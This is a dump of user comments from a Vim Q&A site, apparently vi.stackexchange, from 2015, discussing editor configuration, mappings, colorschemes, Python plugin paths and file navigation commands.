  <row Id="4772" PostId="3422" Score="0" Text="&quot;If those answers do not fully address your question, please edit this question to explain how it is different&quot; - I already explained why it's different. I don't want plugins." CreationDate="2015-05-27T20:05:22.940" UserDisplayName="user2266" />
  <row Id="4773" PostId="3422" Score="0" Text="I see four solutions to your problem: 1. run your commands manually, 2. use modelines in all your files, 3. write a function that analyses the content of the files you are editing, 4. use a function that someone has already written and packaged for you. I vote for [solution 4](https://github.com/Raimondi/YAIFA)." CreationDate="2015-05-27T21:16:35.207" UserId="54" />
  <row Id="4774" PostId="3424" Score="1" Text="It looks like this command is following the behavior of `:make` in terms of how `!` works. It seems that `:make!` will do what you're looking for." CreationDate="2015-05-27T21:41:39.970" UserId="64" />
  <row Id="4775" PostId="3424" Score="0" Text="Yes, that's exactly what I was looking for! If you write this as an answer, I'll mark it as the correct answer." CreationDate="2015-05-28T01:20:30.990" UserId="2270" />
  <row Id="4776" PostId="3420" Score="1" Text="E341 is an internal error according to `:h E341`. Try deleting and reinstalling MacVim and see if it goes away." CreationDate="2015-05-28T07:08:41.443" UserId="46" />
  <row Id="4777" PostId="3426" Score="1" Text="To be more useful to other people you could also indicate how you changed the size of your font ;) If I remember well on gVim and MacVim it is with the option `guifont`." CreationDate="2015-05-28T09:51:21.440" UserId="1841" />
  <row Id="4778" PostId="2451" Score="0" Text="this, along with the comment from the other answer should be the accepted one. Spot on. We had the same issue with a colleague and then I noticed his chosen color scheme only had `guifg` and `guibg` defined for the various `highlight` definitions. Thanks!" CreationDate="2015-05-28T10:48:37.100" UserId="1109" />
  <row Id="4779" PostId="2442" Score="0" Text="This answer is missing the very important fact from the other answer. Most color schemes simply seem to be made for the GUI version of Vim, rather than the terminal version. Many of those color schemes will not even contain a definition for the terminal version and thus they don't appear to work." CreationDate="2015-05-28T10:50:29.223" UserId="1109" />
  <row Id="4780" PostId="2442" Score="0" Text="@0xC0000022L: Thanks for the feedback; judging from the screenshot, this might very well be the case here. I've added corresponding instructions to my answer." CreationDate="2015-05-28T11:05:54.117" UserId="970" />
  <row Id="4781" PostId="3428" Score="0" Text="Related tip: I like to use `set gdefault` in my vimrc. This will add the `/g` flag by default, since this is what I want 95% of the time (you can &quot;undo&quot; the `/g` flag by adding it)." CreationDate="2015-05-28T11:22:23.393" UserId="51" />
  <row Id="4782" PostId="2442" Score="0" Text="@IngoKarkat: great edit. Thanks. I wish I could upvote it once again." CreationDate="2015-05-28T12:51:31.097" UserId="1109" />
  <row Id="4783" PostId="3430" Score="0" Text="I figured that it would just be easier to use a literal string in the first place.  Very helpful!" CreationDate="2015-05-28T13:17:18.630" UserId="865" />
  <row Id="4785" PostId="3428" Score="0" Text="Great answer! I agree with @Carpetsmoker that `gdefault` is useful. Until you forget it's on and do `/g` :)" CreationDate="2015-05-28T13:26:52.247" UserId="131" />
  <row Id="4786" PostId="3431" Score="1" Text="Simple way is map key to three command in row&#xA;`&lt;,&gt;y` - for yank visual range&#xA;`tabnew` - for creating new tab&#xA;`p` - for paste yanked text in first step" CreationDate="2015-05-28T13:42:52.897" UserId="1145" />
  <row Id="4787" PostId="3429" Score="0" Text="I'm not sure I understand your question, but you might find useful the `string()` function.  Combined with `eval()`, it makes it easy to pass things around without bending over backwards to quote values.  You can see it at work f.i. [here](http://vi.stackexchange.com/a/3406/1577)." CreationDate="2015-05-28T13:50:37.113" UserId="1577" />
  <row Id="4788" PostId="3429" Score="0" Text="I was afraid that I hadn't worded the question properly, but I don't really know how to make it clearer. Feel free to edit it." CreationDate="2015-05-28T13:55:20.167" UserId="865" />
  <row Id="4789" PostId="3429" Score="0" Text="Sorry, that wasn't a snark, I'm genuinely not sure I understand what you're trying to do (so I wouldn't know how to edit your question).  Just pointing to `string()` as useful in general, not necessarily here." CreationDate="2015-05-28T13:58:27.880" UserId="1577" />
  <row Id="4790" PostId="3429" Score="0" Text="If this helps at all, I am essentially wanting to convert a literal string (in single quotes) to a normal string (in double quotes) or vice versa.  The difference between literal strings and normal strings is that normal strings allow for special characters, whereas literal strings don't." CreationDate="2015-05-28T14:11:42.717" UserId="865" />
  <row Id="4791" PostId="3419" Score="0" Text="I'm going to assume that you are using Python 3.  Can you check that vim is using Python 3 and not 2?" CreationDate="2015-05-28T14:27:14.770" UserId="622" />
  <row Id="4792" PostId="3419" Score="0" Text="@Sardathrion, you mean by looking at `vim --version`?" CreationDate="2015-05-28T14:42:03.317" UserId="69" />
  <row Id="4793" PostId="3429" Score="0" Text="That's a level of indirection I always try to avoid.  It's usually possible, with `string()`: assignment: `let foobar=&quot;foo\tbar&quot;`, direct use: `:echo foobar`, passing it along: `:exec 'echo ' . string(foobar)`.  Things can get hairy when writing complicated sort functions, or functions for `filter()`, `map()`, and the like.  But even then, `string()` avoids a lot of complexity." CreationDate="2015-05-28T14:45:44.213" UserId="1577" />
  <row Id="4794" PostId="3419" Score="0" Text="The code which causes this error in `jedi_vim.py` is fairly straightforward: `try: import jedi except ImportError: no_jedi_warning()` ... Perhaps your `sys.path` is incorrect? Using `:py print(sys.path)` on my systems reveals that it includes `'/home/martin/.vim/plugged/jedi-vim'` and `'_vim_path_'`... I would guess the first one is required for vim-jedi to work (?) It seems the jedi path is added in `initialize.py`." CreationDate="2015-05-28T15:15:36.753" UserId="51" />
  <row Id="4795" PostId="3419" Score="0" Text="You mentioned you installed jedi system-wide. What happens if you type `import jedi` in the Python commandline? If this also fails, it would suggest you have some sort of generic Python problem (strange `PYTHONPATH`?)" CreationDate="2015-05-28T15:17:50.250" UserId="51" />
  <row Id="4796" PostId="3420" Score="0" Text="It could also be a bug in Vim, MacVim, netrw, or a combination thereof. I tried looking up what `NetrwOptionRestore` does to try and see if there may be a workaround, but netrw is such a mess that I gave up &gt;_&lt;" CreationDate="2015-05-28T15:28:19.827" UserId="51" />
  <row Id="4797" PostId="3228" Score="0" Text="Your code doesn't seem like valid JSX?" CreationDate="2015-05-28T15:45:23.560" UserId="51" />
  <row Id="4798" PostId="3434" Score="4" Text="*&quot;it is causing errors in my PHP scripts&quot;*  -&gt; This is strange? PHP should work fine with a trailing newline. In fact, this is pretty much standard. Perhaps you have a blank line after the `?&gt;` which PHP outputs to the browser (causing the &quot;headers already sent&quot;-error)? You don't need a trailing `?&gt;`, and it is usually recommended to leave it out to prevent exactly this problem." CreationDate="2015-05-28T15:53:24.757" UserId="51" />
  <row Id="4799" PostId="3434" Score="0" Text="I guess thats misleading. Our scripts interpret any output as an error." CreationDate="2015-05-28T15:55:07.303" UserId="2276" />
  <row Id="4800" PostId="3434" Score="0" Text="Also, related question: [How to make vim automatically add a newline to the end of a file?](http://vi.stackexchange.com/q/3298/51)" CreationDate="2015-05-28T15:55:14.753" UserId="51" />
  <row Id="4801" PostId="3438" Score="2" Text="Maybe that's something you should [talk about with the author](https://github.com/yegappan/lid/issues)." CreationDate="2015-05-28T16:11:25.510" UserId="54" />
  <row Id="4802" PostId="3434" Score="0" Text="No. Vim is not adding a new line." CreationDate="2015-05-28T16:13:28.123" UserId="54" />
  <row Id="4803" PostId="3438" Score="0" Text="This is not just the Lid.vim plugin. I have had this issue with ctags as well before." CreationDate="2015-05-28T16:20:08.903" UserId="2277" />
  <row Id="4804" PostId="1981" Score="0" Text="@joeytwiddle Why not add that as an answer?" CreationDate="2015-05-28T16:41:09.073" UserId="51" />
  <row Id="4806" PostId="1981" Score="0" Text="@Sukminder Why not add that as an answer?" CreationDate="2015-05-28T16:41:27.587" UserId="51" />
  <row Id="4807" PostId="3453" Score="3" Text="You could also do `[p` or `]p`." CreationDate="2015-05-28T20:12:11.893" UserId="54" />
  <row Id="4810" PostId="3453" Score="0" Text="@romainl I didn't know about that, but that does indeed seem to do what I want." CreationDate="2015-05-28T21:09:07.323" UserId="1060" />
  <row Id="4811" PostId="3453" Score="1" Text="@romainl Actually, that appears to remove leading spaces when pasting below a blank line, which is not necessarily what I want." CreationDate="2015-05-28T21:52:33.737" UserId="1060" />
  <row Id="4813" PostId="3453" Score="0" Text="Which is why there are both a `[p` (which is probably better written as `]P`) and a `]p`" CreationDate="2015-05-29T05:01:13.170" UserId="1577" />
  <row Id="4815" PostId="3419" Score="0" Text="I mean are you *sure* that vim uses Python3? `:python import sys; print(sys.version)` should tell you." CreationDate="2015-05-29T06:46:15.290" UserId="622" />
  <row Id="4816" PostId="3438" Score="0" Text="`Enter` is implemented internally as `:.cc` (it's actually `:.cc` for quickfix lists and `:.ll` for location lists).  Does the problem still occur if you run `:cc`?" CreationDate="2015-05-29T07:00:38.477" UserId="1577" />
  <row Id="4817" PostId="3453" Score="0" Text="`[p` and `]p` are to be used when you want to paste while keeping the indent of the line above or below. They are not magical replacements for `P` and `p`." CreationDate="2015-05-29T07:19:27.353" UserId="54" />
  <row Id="4819" PostId="3457" Score="2" Text="You can make it shorter by doing: `let &amp;modifiable = !&amp;readonly`" CreationDate="2015-05-29T09:10:43.690" UserId="51" />
  <row Id="4820" PostId="3453" Score="0" Text="@romainl ....so why did you suggest them, then? Autoindent correctly ignores blank lines; it wouldn't have been surprising if `[p` did the same." CreationDate="2015-05-29T09:33:04.497" UserId="1060" />
  <row Id="4821" PostId="3459" Score="0" Text="Thank you for the detailed answer, this works great!" CreationDate="2015-05-29T10:22:30.960" UserId="2287" />
  <row Id="4823" PostId="3438" Score="0" Text="Using `:.cc` works . But Enter is not. Why is that?" CreationDate="2015-05-29T12:36:04.513" UserId="2277" />
  <row Id="4824" PostId="3456" Score="0" Text="This is even better - works without changing my ```.bashrc```. Thank you." CreationDate="2015-05-29T13:21:33.310" UserId="1067" />
  <row Id="4825" PostId="3419" Score="0" Text="@Carpetsmoker, the comment that you originally had, about checking `sys.path` from within vim revealed that it was using a version of python I had installed from source (and completely forgot about). I removed the source python installation and recompiled vim, and now everything is butter. Thanks!" CreationDate="2015-05-29T14:47:27.913" UserId="69" />
  <row Id="4826" PostId="3419" Score="0" Text="@drs Ah, okay. I figured that comment was mistaken, so I removed it; but apparently I was mistaken about being mistaken ;-) I undeleted the comment. In any case, you should add your solution as an answer ;-)" CreationDate="2015-05-29T14:50:59.370" UserId="51" />
  <row Id="4829" PostId="3457" Score="0" Text="@Carpetsmoker Much better as a one liner, thanks!  &#xA;However it would still have to be:  &#xA;`autocmd BufRead * let &amp;modifiable = !&amp;readonly`" CreationDate="2015-05-29T15:11:33.160" UserId="2283" />
  <row Id="4830" PostId="3462" Score="0" Text="Are you using plain JS? OR JSX? (asking because you [previously asked a question about indentation with JSX](https://vi.stackexchange.com/questions/3228/how-to-prevent-vim-jsx-from-mangling-my-indentation))" CreationDate="2015-05-29T17:31:23.627" UserId="51" />
  <row Id="4831" PostId="3463" Score="0" Text="This plugin doesn't seem to allow arbitrary text highlighting as specified in the question, thought it does have its own syntax highlighting." CreationDate="2015-05-29T18:29:51.997" UserId="865" />
  <row Id="4834" PostId="3452" Score="0" Text="This does not directly answer your question but regarding visibility of tabs, I use this `:set listchars=tab:\|\ ,trail:_,extends:&gt;,precedes:&lt;,nbsp:% list`" CreationDate="2015-05-30T00:20:10.303" UserId="2295" />
  <row Id="4835" PostId="3452" Score="0" Text="@cychoi I have an autocmd on buffer-load that checks for tabs and uses something like that to turn them bright yellow if they *are* present, but otherwise I don't want to see leading spaces so I only include trailing spaces in `listchars`. I suppose I could include tabs as well, though...." CreationDate="2015-05-30T00:25:06.413" UserId="1060" />
  <row Id="4836" PostId="3462" Score="0" Text="Plain `.js`, this is `Gulpfile.js`" CreationDate="2015-05-30T03:22:59.617" UserId="237" />
  <row Id="4838" PostId="428" Score="0" Text="Exactly this. I've been using Vim for 8 years and I'm still writing my vimrc. If you try to configure too much at once, you won't remember what you've done and you'll forget to take advantage of it." CreationDate="2015-05-30T05:08:32.500" UserId="64" />
  <row Id="4839" PostId="3467" Score="5" Text="Already answered here: http://stackoverflow.com/questions/13924093/gvim-fold-toggle-using-mouse" CreationDate="2015-05-30T05:30:03.630" UserId="1577" />
  <row Id="4846" PostId="3467" Score="0" Text="Google for &quot;vim mouse fold&quot;, and click &quot;I feel lucky&quot;." CreationDate="2015-05-30T18:40:13.087" UserId="1577" />
  <row Id="4849" PostId="3476" Score="0" Text="You can make the window 80 characters wide: `:set columns 80`." CreationDate="2015-05-31T13:14:37.573" UserId="51" />
  <row Id="4850" PostId="3476" Score="0" Text="The 80 columns limit made sense in the 70s and 80s because that was the usual width of terminals back then. Today, 80 is more superstition than anything. Anyway, Did you try `:vnew`?" CreationDate="2015-05-31T14:06:31.353" UserId="54" />
  <row Id="4851" PostId="3479" Score="0" Text="Thanks, that worked. Why would :find be superior to :edit in this case? Is it because you can pre-filter out matches with &quot;path&quot; while :edit will just search for everything?" CreationDate="2015-05-31T14:26:36.830" UserId="2312" />
  <row Id="4852" PostId="3479" Score="0" Text="Yes. With `:edit **/foo`, your are somewhat restricted to files located below the working directory. With `:find`, you are restricted to the directories specified in `'path'`, which may or may not be under the working directory." CreationDate="2015-05-31T14:30:08.200" UserId="54" />
  <row Id="4853" PostId="3479" Score="0" Text="A quick question about this, why is a `*` necessary at the end of the find command?  I tried using that, and when I hit tab after typing a few characters in, it shows the results, then removes the star." CreationDate="2015-05-31T16:39:50.490" UserId="865" />
  <row Id="4854" PostId="3479" Score="1" Text="@EvergreenTree, `:find bar` only finds files whose name starts with `bar` but `:find *bar` also finds files containing `bar` anywhere in their name. Note that this rule also applies to `:edit` and all related commands." CreationDate="2015-05-31T16:55:42.897" UserId="54" />
  <row Id="4855" PostId="3479" Score="0" Text="Ah, that makes sense." CreationDate="2015-05-31T21:05:49.063" UserId="865" />
  <row Id="4856" PostId="26" Score="0" Text="`:so $m`&lt;Tab&gt;  ← extra-short-cut" CreationDate="2015-05-31T21:46:56.867" UserId="2314" />
  <row Id="4857" PostId="3485" Score="0" Text="There's a plugin floating around that does all this automatically and more (IIRC), but I can't remember its name right now." CreationDate="2015-05-31T21:51:31.673" UserId="1577" />
  <row Id="4858" PostId="3485" Score="0" Text="I imagine that there would be, the vim tip pointed to one at http://www.vim.org/scripts/script.php?script_id=1506  In fact, that plugin was based on that vim tip," CreationDate="2015-05-31T22:06:12.043" UserId="865" />
  <row Id="4859" PostId="3476" Score="1" Text="You might be interested in [Goyo](https://github.com/junegunn/goyo.vim), which sort of does what you want. It does more though, and perhaps some stuff that you are not interested in as well (creates a distraction-free environment)." CreationDate="2015-06-01T06:39:49.377" UserId="21" />
  <row Id="4860" PostId="169" Score="3" Text="[sed](https://en.wikipedia.org/wiki/Sed) was invented for this purpose. You figure out which changes you want to make, expressed as substitutions, then run `sed` to perform them. This also works on streams (i.e. file content that has no end because it is being produced)." CreationDate="2015-06-01T08:30:43.110" UserId="846" />
  <row Id="4861" PostId="3487" Score="0" Text="It would depend on the module. Is is widely packaged, or a more obscure module? Is it one file? Or a lot of files? Is the license compatible with your project's license?" CreationDate="2015-06-01T10:46:14.880" UserId="51" />
  <row Id="4863" PostId="3477" Score="0" Text="Sorry if I was not very clear. This question was not about accidentally changing a read only file; I wanted to stop myself from being able to edit the buffer of a file that I did not have write access for. Sometimes I accidentally open system configuration files as a regular user rather than the root user. In this case I don't have write access to the file, so the buffer appears as read only but Vim will still allow me to edit the buffer. When I try to save I cannot because I don't have write access. I wanted Vim to block changes to the buffer in this case." CreationDate="2015-06-01T13:52:36.177" UserId="2283" />
  <row Id="4864" PostId="3487" Score="0" Text="&gt;My guess is that vim uses it's own python that is compiled in it, therefore I cannot really use pip to install these modules.&#xA;&#xA;Vim may use dynamic linked python more then one version. See `he: python-2-and-3`&#xA;&#xA;Of course I can build vim myself with any version of python (py2 or py3) or with both of them." CreationDate="2015-06-01T14:06:30.180" UserId="1145" />
  <row Id="4865" PostId="3489" Score="1" Text="Obligatory article: [Oil and vinegar - split windows and the project drawer](http://vimcasts.org/blog/2013/01/oil-and-vinegar-split-windows-and-project-drawer/)" CreationDate="2015-06-01T14:38:39.060" UserId="778" />
  <row Id="4866" PostId="3489" Score="0" Text="@Peter: Thanks for your comment, the article is pretty interesting and I'll probably give a try to netrw and the concept of split explorer. I think I understand the advantage of what is explained in the article but the problem is that it doesn't actually solve my problem it just advise to change the tool I use. I'm not against changing my habits but I'd like to solve my problem first and then try a new tool :)" CreationDate="2015-06-01T15:09:36.797" UserId="1841" />
  <row Id="4867" PostId="3491" Score="0" Text="You can set a very low `updatecount`, so that Vim will write to the swap file very often. This obviously may cause slowdowns." CreationDate="2015-06-01T15:13:24.257" UserId="51" />
  <row Id="4868" PostId="3493" Score="0" Text="`b:changedtick` could also be useful in this context: it counts &quot;[t]he total number of changes to the current buffer [...] incremented for each change. An undo command is also a change in this case&quot;.  FWIW." CreationDate="2015-06-01T17:32:42.597" UserId="1577" />
  <row Id="4870" PostId="3477" Score="0" Text="Ah, I see. I got the idea that you wanted this as a failsafe. Disregard my answer then :)" CreationDate="2015-06-01T18:34:29.180" UserId="2311" />
  <row Id="4872" PostId="3489" Score="0" Text="Related, unanswered question on SU: http://superuser.com/q/821720/334516. Maybe `map d&lt;cr&gt; &lt;cr&gt;:NERDTreeClose&lt;cr&gt;` for the mapping?" CreationDate="2015-06-01T20:36:26.413" UserId="205" />
  <row Id="4873" PostId="3489" Score="0" Text="@muru: Thanks you, your mapping works fine and it seems less ugly than mine :) About the question on SU, I'm not sure it is totally related since he wants to open the file in the buffer of NERDTree whereas I want to open it in a new buffer and then close NERDTree buffer: He ends up with a split windows whereas I want to end up with 2 buffers not in a split window." CreationDate="2015-06-02T07:37:16.133" UserId="1841" />
  <row Id="4874" PostId="3496" Score="0" Text="So did you install solarized on the VM?" CreationDate="2015-06-02T07:41:28.433" UserId="51" />
  <row Id="4875" PostId="3496" Score="0" Text="yes, Bundle 'altercation/vim-colors-solarized'" CreationDate="2015-06-02T07:43:37.630" UserId="2332" />
  <row Id="4876" PostId="3416" Score="0" Text="This is not exactly what I was hoping, but it is probably as good as it gets. Indeed from features=normal to features=huge, a few options more options are added. Thanks anyway." CreationDate="2015-06-02T08:30:19.247" UserId="2170" />
  <row Id="4877" PostId="3496" Score="1" Text="If you set the colorscheme manually does it work? aka `:set colorscheme solarized`? If not, then there was a problem with installation." CreationDate="2015-06-02T18:44:23.360" UserId="14" />
  <row Id="4878" PostId="3462" Score="0" Text="Are you using Vim's built in JS syntax or the `vim-javascript plugin`?" CreationDate="2015-06-02T18:46:41.037" UserId="14" />
  <row Id="4879" PostId="2363" Score="0" Text="I can't find the documentation for the `:set &lt;M-j&gt;=\ej` part. What should I search for?" CreationDate="2015-06-03T01:05:51.887" UserId="2334" />
  <row Id="4880" PostId="3496" Score="0" Text="`:colorscheme solarized` is works, but background color doesn't change." CreationDate="2015-06-03T01:46:27.947" UserId="2332" />
  <row Id="4881" PostId="3499" Score="0" Text="So, building on your answer: to get the full path as the OP requested, you'd do something like `Ctrl-r =expand('%:p')`.  This uses the [= register](http://vimdoc.sourceforge.net/htmldoc/change.html#quote_=)." CreationDate="2015-06-03T05:25:28.907" UserId="1577" />
  <row Id="4882" PostId="3501" Score="1" Text="This would pointlessly obliterate register `a`.  Try something like this instead: `cnoremap &lt;M-q&gt; &lt;C-r&gt;=fnameescape(expand('%:p'))&lt;CR&gt;`" CreationDate="2015-06-03T09:05:13.527" UserId="1577" />
  <row Id="4883" PostId="3462" Score="0" Text="No additional plugins, didn't even think about installing one. Think it worth trying?" CreationDate="2015-06-03T10:47:14.997" UserId="237" />
  <row Id="4884" PostId="3496" Score="0" Text="Is your terminal _really_ 256 colors? What is the output of `echo $TERM`?" CreationDate="2015-06-03T11:41:23.660" UserId="1018" />
  <row Id="4885" PostId="3496" Score="0" Text="`xterm-256color`" CreationDate="2015-06-03T12:45:07.483" UserId="2332" />
  <row Id="4887" PostId="3509" Score="2" Text="@lcd047: In what way does this not answer the question? The question was to find a solution to &quot;autocomplete the arguments of a function (or show them at least.)&quot;. I suggested a solution that would show the arguments of a function. You proposed the completion of arguments, I proposed the showing of them. The questioner can pick his preference. I don't see the problem here." CreationDate="2015-06-04T04:05:37.557" UserId="246" />
  <row Id="4888" PostId="3512" Score="0" Text="Do you want to use syntax folding *and* comment folding? Or *only* comment folding?" CreationDate="2015-06-04T08:25:57.940" UserId="51" />
  <row Id="4889" PostId="3512" Score="0" Text="@Carpetsmoker, syntax folding + comment folding would be ok if one could say 'open all folds, except for comments'. Otherwise, comment folding without syntax folding would be fine as well." CreationDate="2015-06-04T09:38:08.527" UserId="2357" />
  <row Id="4890" PostId="3505" Score="0" Text="You mentioned 27 Vim servers running. I've never run Vim server. Would you offer some insight to your workflow using Vim servers. Comparatively I use Vim with TMUX, opening files is a matter of TMUX copy/paste and if in a GUI environment (open Vim from gui app) it spawns a MacVIM instance. Would be cool if it went to my running terminal Vim instance instead. Then again most external editor implementations monitor when the process exits before thinking the file is completed. But the server idea might be nice in things like IDE's which have crappy editors built in and need Vim to be effective." CreationDate="2015-06-04T12:31:34.713" UserId="544" />
  <row Id="4891" PostId="3514" Score="0" Text="Why do you want to trigger a function when entering / leaving command mode, rather than entering / leaving insert mode?" CreationDate="2015-06-04T12:59:27.767" UserId="1577" />
  <row Id="4892" PostId="3515" Score="0" Text="Does this misfire when using the expression register in Command-line mode?" CreationDate="2015-06-04T13:14:59.433" UserId="64" />
  <row Id="4893" PostId="3514" Score="0" Text="If relativenumbers are on in normal mode and I hit `:` then my range (`.,+3`) is more complicated then actual line numbers which I would see if `norelativenumbers` was set. and so the request that when switching into command mode to swap the relative numbers setting and put it back when leaving. This is how the plugin works for insert/normal mode switching but vim doesn't provide a normal/command event." CreationDate="2015-06-04T15:38:51.440" UserId="544" />
  <row Id="4894" PostId="3454" Score="1" Text="@EvergreenTree Note that there's a section in the [vim-notes help](https://github.com/xolox/vim-notes#txtfmt) on embedding Txtfmt highlighting within notes. More generally, the Txtfmt plugin supports &quot;nesting&quot; Txtfmt highlighting within other types of syntax regions. You could even highlight your C comments if you really wanted to. ;-)" CreationDate="2015-06-04T15:48:09.430" UserId="2281" />
  <row Id="4897" PostId="3515" Score="0" Text="Unfortunately this is not perfect. It will now trigger the `&lt;Esc&gt;` map when you press the up arrow (since they use terminal ESC sequences)." CreationDate="2015-06-05T01:25:21.313" UserId="544" />
  <row Id="4898" PostId="3514" Score="0" Text="Note that the 'command-mode' term, while not widely used, actually means 'normal mode'. What you want is 'command-line mode' (since you add the `:` to explain, the idea gets through, though)." CreationDate="2015-06-05T08:13:51.073" UserId="1800" />
  <row Id="4899" PostId="3515" Score="0" Text="@Sukima Confirmed ... I need to meditate on a solution..." CreationDate="2015-06-05T08:51:07.373" UserId="51" />
  <row Id="4900" PostId="3514" Score="0" Text="I edited it. To be fair in my 20 some years reading the Vim docs I don't recall a reference to _command-line mode_. I have seen normal, insert, command (from `cmap` or command mapping style), and ex modes. The last (ex) is usually over loaded to mean either the command line from `:` or the batch mode from `Q`." CreationDate="2015-06-05T12:29:14.730" UserId="544" />
  <row Id="4901" PostId="3514" Score="0" Text="Well, just run these commands in vim:&#xA;&#xA;&#xA;    `:h command-mode`&#xA;&#xA;&#xA;    `:h command-line-mode`" CreationDate="2015-06-05T12:31:44.157" UserId="1800" />
  <row Id="4902" PostId="3523" Score="3" Text="I use `Ctrl+g` for this" CreationDate="2015-06-05T16:42:36.170" UserId="500" />
  <row Id="4903" PostId="3523" Score="0" Text="Which is the same as `:file` :-) I wanted to give that as an answer, but is doesn't show the amount of characers. I'm not sure how to get *exactly* that line..." CreationDate="2015-06-05T17:29:34.103" UserId="51" />
  <row Id="4904" PostId="3523" Score="3" Text="You can display this information in your statusline with `let &amp;statusline = '&quot;%f&quot; %{line(&quot;$&quot;)}L, %{line2byte(line(&quot;$&quot;))}C'`. You can also make a mapping to echo this: `nnoremap &lt;Leader&gt;fi :echo '&quot;' . expand(&quot;%&quot;) . '&quot; ' . line(&quot;$&quot;) . &quot;L, &quot; . line2byte(line(&quot;$&quot;)) . &quot;C&quot;&lt;CR&gt;`" CreationDate="2015-06-05T18:32:23.723" UserId="1306" />
  <row Id="4905" PostId="3523" Score="0" Text="@Carpetsmoker I think it shows bytes, not characters, despite the &quot;C&quot;. I haven't looked carefully but for me the number seems to agree with output from `wc -c`, not from `wc -m`." CreationDate="2015-06-05T18:34:51.677" UserId="1306" />
  <row Id="4906" PostId="169" Score="0" Text="I have aliased `less`, `more` and `man` to `vimpager`.&#xA;https://github.com/rkitover/vimpager" CreationDate="2015-06-06T08:16:12.783" UserId="1145" />
  <row Id="4907" PostId="3531" Score="0" Text="But echo is not going to make any replacements for me right? How do I do the search and replace thingy with variables?" CreationDate="2015-06-06T08:29:43.960" UserId="2369" />
  <row Id="4908" PostId="3530" Score="2" Text="That might be a dumb question but why do you want to create such a function? The `substitute` command isn't satisfying enough for you or it's just for vimscript training purpose?" CreationDate="2015-06-06T12:06:41.447" UserId="1841" />
  <row Id="4909" PostId="3529" Score="3" Text="You can use `execute '/' . @l` if you want exactly the same behaviour as typing `/&lt;C-r&gt;l`. `search()` behaves subtly different on some points (which may be considered desirable or undesirable depending on what you're doing)." CreationDate="2015-06-06T13:01:39.503" UserId="51" />
  <row Id="4910" PostId="3531" Score="0" Text="@caffeinemachine your title queston only asks about how arguments work, which this answer covers. It isn't very clear from your question that you mostly care about the actual replacement. Perhaps consider re-wording your title and adding clarification to the question." CreationDate="2015-06-06T15:37:51.353" UserId="227" />
  <row Id="4911" PostId="3438" Score="0" Text="You have a plugin that maps `Enter` to something else." CreationDate="2015-06-06T16:17:17.273" UserId="1577" />
  <row Id="4912" PostId="3530" Score="2" Text="It's just for training purpose." CreationDate="2015-06-06T18:39:18.137" UserId="2369" />
  <row Id="4913" PostId="3531" Score="0" Text="I agree. The title and the body of the question were rather different. But the problem is now solved." CreationDate="2015-06-06T18:40:50.140" UserId="2369" />
  <row Id="4914" PostId="3534" Score="0" Text="That regexp doesn't seem to work?" CreationDate="2015-06-06T19:06:05.417" UserId="51" />
  <row Id="4915" PostId="3534" Score="0" Text="@Carpetsmoker what do you mean?" CreationDate="2015-06-06T19:07:08.927" UserId="342" />
  <row Id="4916" PostId="3534" Score="0" Text="What are you supposed to do if two such headers are more than 400 KB apart?" CreationDate="2015-06-06T19:17:41.857" UserId="1577" />
  <row Id="4917" PostId="3534" Score="0" Text="@lcd047 I will upload one. Any way, this is unlikely to happen." CreationDate="2015-06-06T19:29:43.220" UserId="342" />
  <row Id="4918" PostId="3534" Score="0" Text="Do you want to round up or down?  That is, if the 400 KB boundary falls in the middle of a section, do you want that section included or not?" CreationDate="2015-06-06T19:32:12.393" UserId="1577" />
  <row Id="4919" PostId="3534" Score="0" Text="@lcd047 I think down will be the best." CreationDate="2015-06-06T19:34:42.357" UserId="342" />
  <row Id="4920" PostId="3497" Score="0" Text="I created a new file erb.vim as you mentioned, then open an erb file, tried `ds=`, it didn't work. What might be wrong?" CreationDate="2015-06-07T00:17:52.180" UserId="2289" />
  <row Id="4921" PostId="3538" Score="0" Text="Very helpful. Can you tell me just one thing though. Is it necessary use a variable of the type `l:save_cursor`. Woudn't just `save_cursor` suffice?" CreationDate="2015-06-07T02:41:04.913" UserId="2369" />
  <row Id="4922" PostId="3538" Score="2" Text="@caffeinemachine Yeah, the `l:` is mostly optional, I like typing it anyway, but you don't have to ;-) Just remember that if a special (`v:`) variable exists it takes precedence." CreationDate="2015-06-07T02:45:02.610" UserId="51" />
  <row Id="4923" PostId="3530" Score="0" Text="oh ok then have fun with that :)" CreationDate="2015-06-07T07:55:37.607" UserId="1841" />
  <row Id="4924" PostId="3536" Score="0" Text="Common practice is to use `s:` instead of `&lt;SID&gt;` where possible. The latter is required in mappings, but it's better to use the former in function definitions and commands." CreationDate="2015-06-07T15:04:38.660" UserId="64" />
  <row Id="4925" PostId="3536" Score="0" Text="@tommcdo I believe there's a mapping at the end of the blockquote?" CreationDate="2015-06-07T15:12:37.110" UserId="1577" />
  <row Id="4926" PostId="3454" Score="0" Text="This solve the problem ! thanks !" CreationDate="2015-06-07T18:55:00.607" UserId="2145" />
  <row Id="4927" PostId="3541" Score="0" Text="Upvoted purely for `awk` solution! :)" CreationDate="2015-06-07T22:27:57.000" UserId="1800" />
  <row Id="4928" PostId="3454" Score="0" Text="Excellent! Glad to help." CreationDate="2015-06-08T01:04:49.233" UserId="2281" />
  <row Id="4929" PostId="1915" Score="0" Text="also check this answer: http://stackoverflow.com/a/16407391/164835" CreationDate="2015-06-08T13:08:01.617" UserId="1569" />
  <row Id="4930" PostId="3438" Score="0" Text="the mapping is introduced by the line `map &lt;C-m&gt; :tnext&lt;CR&gt;`. When i remove this line, there is no mapping for &lt;CR&gt; but when i add it, there is  mapping for &lt;CR&gt; . Any idea why?" CreationDate="2015-06-08T13:58:43.037" UserId="2277" />
  <row Id="4931" PostId="3438" Score="0" Text="I got the issue. http://stackoverflow.com/questions/3935970/vim-how-to-map-ctrl-m-without-affecting-return-keypress-as-well" CreationDate="2015-06-08T14:01:32.330" UserId="2277" />
  <row Id="4932" PostId="3497" Score="0" Text="@canoe There are 2 problems. 1) I had a typo in the mapping, It should be `nmap` instead of `nnmap`. 2) The `'filetype'` for *.erb files is `eruby` not `erb`. So you will need to name your file: `~/.vim/after/ftplugin/eruby.vim`" CreationDate="2015-06-08T14:58:13.293" UserId="778" />
  <row Id="4933" PostId="3476" Score="0" Text="Thanks, Goyo looks very nice :)" CreationDate="2015-06-08T15:34:38.883" UserId="2311" />
  <row Id="4934" PostId="3483" Score="0" Text="Looks good but I went the Goyo way. Thanks anyway, perhaps in another use case I might get back to your plugin." CreationDate="2015-06-08T15:35:14.500" UserId="2311" />
  <row Id="4935" PostId="3543" Score="0" Text="Vim already knows which `$` characters are opening and which are closing because it highlights math segments. Could the information used by highlighting be leveraged for that improved `%` command?" CreationDate="2015-06-08T21:53:19.827" UserId="8" />
